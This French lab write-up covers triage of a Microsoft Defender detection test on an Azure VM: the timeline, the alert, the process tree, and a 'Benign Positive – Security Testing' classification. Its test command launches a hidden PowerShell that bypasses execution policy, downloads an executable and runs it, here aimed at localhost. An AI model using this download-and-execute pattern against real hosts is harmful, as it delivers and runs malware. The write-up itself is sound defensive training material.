# Enquête et classification du test de détection

## Le test lancé
Commande inoffensive (dérivée du test officiel Microsoft), exécutée via **Run Command** pour ne pas ouvrir RDP :

```powershell
# PowerShell caché qui "télécharge" un .exe vers 127.0.0.1 (rien n'est réellement téléchargé)
$cmd = "(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe','C:\test-MDATP-test\invoice.exe');Start-Process 'C:\test-MDATP-test\invoice.exe'"
Start-Process powershell.exe -ArgumentList "-NoExit -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd"
```

## Télémétrie ≠ alerte
L'EDR a tout enregistré dans la **Timeline** de l'appareil, avec le mappage MITRE :

| Heure (locale) | Événement | Technique MITRE |
|---|---|---|
| 23:08:56 | PowerShell + BITS Jobs observés | T1059.001 / T1197 |
| 23:08:56 | `powershell.exe executed a script` (AMSI) | — |
| 23:08:56 | `created file invoice.exe` | — |
| 23:08:59 | `failed to establish connection with 127.0.0.1:80` | — |
| 23:08:59 | `deleted invoice.exe` | T1070.004 (suppression de fichier) |

La **télémétrie** est enregistrée en continu ; une **alerte** n'apparaît que lorsqu'une règle juge l'ensemble suspect.

## L'alerte
- **Nom :** Suspicious RunCommandExtension.exe behavior detected
- **Source :** EDR · **Technologie :** Behavior (comportementale) · **Catégorie :** Discovery · **Gravité :** Medium
- Defender a reconnu qu'un **Run Command Azure** lançait un PowerShell caché qui télécharge un exécutable — le risque Run Command identifié au lab 3.

## Arbre de processus (preuve)
```
WindowsAzureGuestAgent.exe
 └─ cmd.exe  …RunCommandWindows\1.1.22\enable.cmd
     └─ RunCommandExtension.exe "enable"
         └─ cmd.exe /C powershell -ExecutionPolicy Unrestricted -File script1.ps1
             └─ powershell.exe  (script1.ps1)
                 └─ powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden -Command …
```
Trois signaux suspects dans une même ligne de commande : `-WindowStyle Hidden`, `-ExecutionPolicy Bypass`, `DownloadFile`. Utilisateur : **SYSTEM** (signature de Run Command).

## La classification : la nuance clé
| Option | Sens | Ici |
|---|---|---|
| True Positive | Activité malveillante réelle | ❌ |
| False Positive | Alerte déclenchée à tort | ❌ (l'alerte a eu raison) |
| **Benign Positive** (*Informational, expected activity*) | Réel, détecté à juste titre, mais légitime | ✅ **Security Testing** |

L'alerte **n'est pas fausse** : le comportement était bien suspect. C'est l'*intention* qui était légitime (un test). Beaucoup de débutants répondent « faux positif » — c'est l'erreur à éviter.

**Traitement du cas :** assigné → classé *Benign Positive – Security Testing* → commentaire (test volontaire, chaîne vérifiée, aucune action malveillante) → **Resolved**.

## Méthode de réponse (recommandations A-D de Defender)
- **A. Valider** : arbre de processus, Timeline, utilisateur, origine. (fait)
- **B. Délimiter** (*scope*) : 1 appareil, 0 utilisateur, 0 boîte.
- **C. Contenir** : isoler, tuer les processus. (inutile ici — test)
- **D. Escalader** vers l'équipe IR si nécessaire.
